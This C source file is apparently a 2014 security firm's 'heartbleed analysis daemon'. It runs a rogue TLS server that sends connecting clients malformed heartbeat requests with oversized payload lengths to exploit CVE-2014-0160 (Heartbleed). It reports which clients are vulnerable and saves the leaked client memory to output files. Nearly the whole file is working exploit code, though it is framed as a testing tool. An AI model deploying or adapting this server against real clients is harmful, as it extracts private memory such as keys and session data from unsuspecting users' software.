/*The MIT License (MIT)

Copyright (c) 2014 Curesec GmbH <https://www.curesec.com> security@curesec.com

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
*/



#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <getopt.h>
#include <signal.h>
#include <netdb.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <arpa/inet.h>
#include <openssl/bio.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/tls1.h>
#include <openssl/rand.h>
#include <openssl/buffer.h>
#include <pthread.h>
#include <errno.h>

#define SOCKET_ERROR   -1
#define SOCKET_INVALID -1
#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_RESET   "\x1b[0m"
#define COLOR_YELLOW  "\x1b[33m"

#define n2s(c,s) ((s=(((unsigned int)(c[0]))<< 8)| \
                  (((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
                   c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

pthread_mutex_t lock;

struct heartbeat_t {
  int first;
  int repeat;
  int read_bytes;
  int fd;
};

struct conn_t {
  int cs;
  int port;
  char * ip;
};

static uint16_t type = 1;

int ssl3_write_bytes(SSL *s, int type, const void *buf, int len);
int ssl3_do_uncompress(SSL *ssl);
int ssl3_read_n(SSL *s, int n, int max, int extend);
int tls1_enc(SSL *s, int snd);
int tls1_mac(SSL *ssl, unsigned char *md, int snd);
void ssl3_cbc_copy_mac(unsigned char* out,
                       const SSL3_RECORD *rec,
                       unsigned md_size,unsigned orig_len);
int open_listener(uint16_t port);
SSL_CTX* init_server_ctx(void);
void load_certificates(SSL_CTX* ctx, const char* CertFile, const char* KeyFile);
void * heartbeat_send(SSL* ssl, unsigned int type);
void heartbeat_recv(SSL* ssl, struct heartbeat_t *hb, char * filename);
void usage(void) __attribute__ ((noreturn));
void * heartbeat_request_handler(void *arg);

void *
heartbeat_request_handler(void *arg)
{
  char *buff;
  buff = malloc(4096);
  memset(buff, 0, 4096);

  SSL *ssl;
  SSL_CTX *ctx;

  struct conn_t *con = (struct conn_t*) arg;

  int cs = (int) con->cs;

  if (cs < 0) {
    close(cs);
    return 0;
  }

  struct heartbeat_t hb;
  hb.first = 0;
  hb.repeat = 1;
  hb.read_bytes = 0;
  hb.fd = 0;


  time_t rawtime;
  struct tm * timeinfo;
  time(&rawtime);
  timeinfo = localtime(&rawtime);
  char buffer [80];
  strftime (buffer,80,"%H:%M:%S",timeinfo);

  char buf[256];
  snprintf(buf, sizeof buf, "out/%s:%d_%s", con->ip, con->port, buffer);

  ctx = init_server_ctx();
  load_certificates(ctx, "server.crt", "server.key");
  ssl = SSL_new(ctx);

  SSL_accept(ssl);
  SSL_set_fd(ssl, cs);
  
  fd_set set;
  FD_ZERO(&set);
  FD_SET(cs, &set);

  struct timeval timeout;
  timeout.tv_sec = 0;
  timeout.tv_usec = 100000;
  int flags_cs = fcntl(SSL_get_fd(ssl), F_GETFL, 0);
  fcntl(SSL_get_fd(ssl), F_SETFL, flags_cs | O_NONBLOCK);

  int ss = -1;
  int bytes;

  int error; 


  while (1) {
    FD_ZERO(&set);
    FD_SET(SSL_get_fd(ssl), &set);

    ss = select(SSL_get_fd(ssl) + 1, &set, NULL, NULL, &timeout);

    if (ss <= 0) {
      break;
    }

    if (FD_ISSET(SSL_get_fd(ssl), &set)) {
      ERR_clear_error();  
      if ((bytes = SSL_read(ssl, buff, 4095)) < 0) {
        error = SSL_get_error(ssl, bytes);

        switch(error) {
          case SSL_ERROR_SYSCALL:
            continue;
          default:
            break;
        }
        break;
      }
    } else {
      break;
    }
  }

  flags_cs = fcntl(cs, F_GETFL, 0);
  flags_cs &= ~O_NONBLOCK;
  fcntl(cs, F_SETFL, flags_cs);

  if (!ssl->tlsext_heartbeat & SSL_TLSEXT_HB_ENABLED ||
      ssl->tlsext_heartbeat & SSL_TLSEXT_HB_DONT_SEND_REQUESTS) {
    printf(COLOR_RED "[error]" COLOR_RESET " heartbeat extension is unsupported\n");
    //SSL_CTX_free(ctx);
    close(cs);
    return 0;
  }

  heartbeat_send(ssl, type);

  while(hb.repeat == 1) {
    heartbeat_recv(ssl, &hb, buf);

    // browser
    if (hb.repeat == 3) {
      printf(COLOR_GREEN "[info]" COLOR_RESET " no answer, trying again\n");
      hb.first = 0;
      heartbeat_send(ssl, type);
      int bytes = SSL_read(ssl, buff, 4095);
      hb.repeat = 1;
    }
  }

  SSL_CTX_free(ctx);
  close(cs);

  return 0;
}

int
open_listener(uint16_t port)
{
  int sd;
  int cs;
  int error;
  int i = 1;
  char hname[NI_MAXHOST];
  char sname[NI_MAXSERV];

  struct sockaddr sa;
  struct sockaddr_in sin;

  if ((sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == SOCKET_INVALID) {
    return -1;
  }

  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  sin.sin_addr.s_addr = INADDR_ANY;

  memcpy(&sa, &sin, sizeof(struct sockaddr_in));
  setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char*)&i, sizeof(i));

  if (bind(sd, &sa, sizeof(sa)) != 0) {
    printf(COLOR_RED "[error]" COLOR_RESET " can't bind port\n");
    exit(1);
  }

  if (listen(sd, SOMAXCONN) == SOCKET_ERROR) {
    close(sd);
    printf(COLOR_RED "[error]" COLOR_RESET " can't configure listening port\n");
    exit(1);
  }

  struct sockaddr_in addr;
  socklen_t len = sizeof(addr);

  while (1) {
    if ((cs = accept(sd, (struct sockaddr*) &addr, &len)) != SOCKET_ERROR) {
      struct conn_t con;
      con.cs = cs;
      con.port = port;
      error = getnameinfo((struct sockaddr *) &addr, len, hname, sizeof (hname), sname, sizeof (sname), 0);

      if (error) {
        (void) fprintf(stderr, "getnameinfo: %s\n",
            gai_strerror(error));
      } else {
        (void) printf(COLOR_GREEN "[info]" COLOR_RESET " connection from %s/%s, ipv4 address: " COLOR_YELLOW "%s" COLOR_RESET"\n", hname, sname, inet_ntoa(addr.sin_addr));
      }

      con.ip = inet_ntoa(addr.sin_addr);

      pthread_t t;
      pthread_create(&t, 0, heartbeat_request_handler, (void*)&con);
    }
  }
}

SSL_CTX*
init_server_ctx(void)
{
  const SSL_METHOD *method;
  SSL_CTX *ctx;

  OpenSSL_add_all_algorithms();
  SSL_load_error_strings();
  method = SSLv23_server_method();
  ctx = SSL_CTX_new(method);

  if (ctx == NULL) {
    ERR_print_errors_fp(stderr);
    exit(1);
  }

  SSL_CTX_set_options(ctx, SSL_OP_ALL | SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
	SSL_CTX_SRP_CTX_init(ctx);

  return ctx;
}

void
load_certificates(SSL_CTX* ctx, const char* CertFile, const char* KeyFile)
{
  if (SSL_CTX_use_certificate_file(ctx, CertFile, SSL_FILETYPE_PEM) <= 0) {
    ERR_print_errors_fp(stderr);
    exit(1);
  }

  if (SSL_CTX_use_PrivateKey_file(ctx, KeyFile, SSL_FILETYPE_PEM) <= 0) {
    ERR_print_errors_fp(stderr);
    exit(1);
  }

  if (!SSL_CTX_check_private_key(ctx)) {
    fprintf(stderr, "private key does not match the public certificate\n");
    exit(1);
  }
}

void *
heartbeat_send(SSL* ssl, unsigned int payload_type)
{
  unsigned char *buf, *p;
  buf = OPENSSL_malloc(3);
  p = buf;
  *p++ = TLS1_HB_REQUEST;

  switch(payload_type) {
    case 1:
      s2n(0x0,p);
      break;
    case 2:
      s2n(0x00ff,p);
      break;
    case 3:
      s2n(0xffff,p);
      break;
    default:
      break;
  }

  printf(COLOR_GREEN "[info]" COLOR_RESET " sending heartbeat packet\n");
  ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, buf, 3);
  OPENSSL_free(buf);

  return ssl;
}

void
heartbeat_recv(SSL* ssl, struct heartbeat_t *hb, char * filename)
{
  int n;
  SSL3_RECORD *ssl3_record;
  unsigned int output;
  unsigned char *p;
  int i;

  ssl3_record = &(ssl->s3->rrec);

  if ((ssl->rstate != SSL_ST_READ_BODY) ||
      (ssl->packet_length < SSL3_RT_HEADER_LENGTH)) {
    n = ssl3_read_n(ssl, SSL3_RT_HEADER_LENGTH, (int)ssl->s3->rbuf.len, 0);

    if (n <= 0) {
      printf(COLOR_RED "[error]" COLOR_RESET " read <= 0 bytes.\n");
      hb->repeat = 0;
      return;
    }

    ssl->rstate = SSL_ST_READ_BODY;
    p = ssl->packet;
    ssl3_record->type = *(p++);
    p = p + 2;
    n2s(p, ssl3_record->length);

    if (ssl3_record->type == 24) {
      if (hb->first == 0) {
        printf(COLOR_GREEN "[info]" COLOR_RESET " client is" COLOR_RED " vulnerable" COLOR_RESET " to CVE-2014-0160\n");
      }
   } else if (ssl3_record->type == 23){
      hb->first = 0;
      hb->repeat = 3;
      return;
   } else {
      printf(COLOR_GREEN "[info]" COLOR_RESET " client is not vulnerable\n");
      hb->repeat = 0;
      return;
    }
  }

  if (ssl3_record->length > ssl->packet_length - SSL3_RT_HEADER_LENGTH) {
    i = (int) ssl3_record->length;
    n = ssl3_read_n(ssl, i, i, 1);

    if (n <= 0) {
      hb->repeat = 3;
      return;
    }
  }

  ssl->rstate = SSL_ST_READ_HEADER;
  ssl3_record->input = &(ssl->packet[SSL3_RT_HEADER_LENGTH]);
  ssl3_record->data = ssl3_record->input;
  tls1_enc(ssl, 0);

  if (ssl->expand != NULL) {
    ssl3_do_uncompress(ssl);
  }

  ssl3_record->off = 0;
  ssl->packet_length = 0;

  if (hb->first == 0) {
    unsigned int heartbleed_len = 0;
    unsigned char *fp = ssl->s3->rrec.data;
    fp++;
    memcpy(&heartbleed_len, fp, 2);
    heartbleed_len = (heartbleed_len & 0xff) << 8 |
                     (heartbleed_len & 0xff00) >> 8;
    hb->first = 2;
    hb->read_bytes = heartbleed_len + 16;
  }

  hb->read_bytes -= ssl3_record->length;

  if (hb->read_bytes > 0) {
    hb->repeat = 1;
  } else {
    hb->repeat = 0;
  }

  output = ssl->s3->rrec.length - 3;

  if (output > 0) {
    int fd = open(filename,O_RDWR|O_CREAT|O_APPEND,0700);

    if(hb->first==2){
      hb->first--;
      write(fd, ssl->s3->rrec.data+3, ssl->s3->rrec.length);
      printf(COLOR_GREEN "[info]" COLOR_RESET " wrote %d bytes to output file\n",ssl->s3->rrec.length-3);
    }
    else{
      write(fd, ssl->s3->rrec.data+3, ssl->s3->rrec.length);
      printf(COLOR_GREEN "[info]" COLOR_RESET " wrote %d bytes to output file\n",ssl->s3->rrec.length);
    }
    close(fd);
  }
}

void
usage(void)
{
  fprintf(stderr,
      "hbad - heartbleed analysis daemon\nby security@curesec.com (May 2014)\nusage: ./hbad [-pov] [-p port] [-t type (1,2,3)]\n"
      );
  exit(1);
}

int
main(int argc, char **argv)
{
  int ch;
  uint16_t port;
  char *end;

  SSL_library_init();
  OpenSSL_add_all_digests();
  OpenSSL_add_all_ciphers();

  port = 0;

  while ((ch = getopt(argc, argv, "p:t:")) != -1) {
    switch (ch) {
      case 'p':
        port = (uint16_t) strtol(optarg, &end, 10);
        break;
      case 't':
        type = (uint16_t) strtol(optarg, &end, 10);
        if (type != 1 && type != 2 && type != 3) {
          usage();
        }
        break;
      case '?':
      default:
        usage();
    }
  }

  if (argc == 1) {
    usage();
  }

  if (pthread_mutex_init(&lock, NULL) != 0) {
    printf("\n mutex init failed\n");
    return 1;
  }

  open_listener(port);

  return 0;
}
